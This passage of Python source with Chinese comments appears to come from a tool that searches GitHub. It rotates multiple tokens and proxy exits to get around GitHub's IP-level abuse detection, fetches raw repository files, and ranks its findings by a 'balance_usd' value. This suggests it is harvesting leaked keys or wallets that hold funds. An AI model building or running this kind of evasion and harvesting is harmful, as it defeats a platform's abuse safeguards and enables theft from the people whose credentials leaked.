                            f"GitHub 限流惩罚期 {wait}s（IP 级滥用检测）——跳过本轮，下轮再试",
                            "warning")
                        return []
                    # 必然周期性撞上），记录为 info 不刷屏 warning；只有等待较久
                    # （窗口被外部占用/真实限流）才 warning。
                    if wait > 20:
                        self.log(
                            f"GitHub API 限流 (HTTP {r.status_code}), 等待 {wait}s (attempt {attempt+1})...",
                            "warning")
                    else:
                        self.log(
                            f"GitHub 限流窗口轮转, 等待 {wait}s (attempt {attempt+1})", "info")
                    # 记录 429 时刻：per-token + 全局(IP 级)双轨追踪。
                    # v2.4.6: 长 Retry-After(>60s)→ 激活全局惩罚箱(所有 token 降速 10 分钟),
                    # 这是 IP 级滥用检测的核心防御——per-token pacing 挡不住同 IP 多 token。
                    with self._gh_pacing_lock:
                        self._gh_last_429[pacing_key] = time.time()
                        self._gh_429_times.setdefault(pacing_key, []).append(time.time())
                        self._global_429_times.append(time.time())
                        # 惩罚箱触发条件:单次 Retry-After > 60s(明确滥用信号)
                        if wait > 60 and self._penalty_box_until < time.time():
                            self._penalty_box_until = time.time() + 600  # 10 分钟惩罚箱
                            self.log("GitHub IP 级滥用检测触发惩罚箱:所有 token 降速至 ~2 req/min,持续 10 分钟", "warning")
                    time.sleep(wait)
                    # 退避等待计入限速预算：重试后 pacing 从"现在"重新计，
                    # 否则下一查询会用过期时间戳提前撞墙（pacing 在循环外）。
                    self._gh_pacing_calls[pacing_key] = time.time()
                    continue
                if r.status_code == 422:
                    return []
                # 仅对 5xx 服务端瞬态错误重试；其余 4xx 直接放弃
                _logger.debug("github unexpected HTTP %s attempt=%d", r.status_code, attempt + 1)
                self.log(f"GitHub API HTTP {r.status_code} (attempt {attempt+1})", "warning")
                # 503 is often IP-level throttling — switch route and cooldown
                if r.status_code == 503:
                    self._on_ip_rate_limit(token)
                if r.status_code >= 500 and attempt < max_retries - 1:
                    time.sleep(5 + attempt * 5)
                    continue
                return []
            except (requests.RequestException, requests.Timeout) as e:
                _logger.debug("github network error attempt=%d: %r", attempt + 1, e)
                self.log(f"GitHub API 网络错误: {e} (attempt {attempt+1})", "warning")
                # v2.5.1: 传输故障(TLS RST/连接重置)立即换端口——2026-09-22 实测
                # 同端口重试基本无效(105 错误中 23 查询 3 败全丢,SSL EOF 随时间
                # escalate)。换端口后下一 attempt 走新节点,重算 proxies 生效。
                if self._multi_proxy and self._multi_proxy.num_proxies > 1:
                    self._multi_proxy.on_transport_failure(token)
                    proxies = self._route_for_token(token)
                if attempt < max_retries - 1:
                    time.sleep(3 + attempt * 3)
                else:
                    return []
        return []

    def _fetch_raw(self, repo: str, path: str, branch: str = "main") -> str:
        # 只尝试传入的 branch + main（原循环 3 次会放大超时，导致整批下载挂死）
        # 用 connect/read 分离超时，避免代理挂起时永久阻塞
        # v2.5.3: 多代理模式下轮转出口——回退下载(30 文件/查询)是唯一未分摊
        # 的大流量源,长跑 429×3 均为 IP 级,打散到多 IP 分摊压力。
        if self._multi_proxy and self._multi_proxy.num_proxies > 0:
            proxies = self._multi_proxy.get_any_proxy()
        else:
            proxies = self._smart_proxy.get_proxies_dict()
        for br in [branch, "main"]:
            url = f"https://raw.githubusercontent.com/{repo}/{br}/{path}"
            try:
                resp = requests.get(url, timeout=(5, 12),
                                    headers={"User-Agent": "Mozilla/5.0"},
                                    proxies=proxies)
                if resp.status_code == 200:
                    return resp.text
            except Exception:
                pass
        return ""


    # ---- 结果处理 ----

    def sort_results(self, results: list) -> list:
        results.sort(key=lambda x: x.get("balance_usd", 0), reverse=True)
        return results


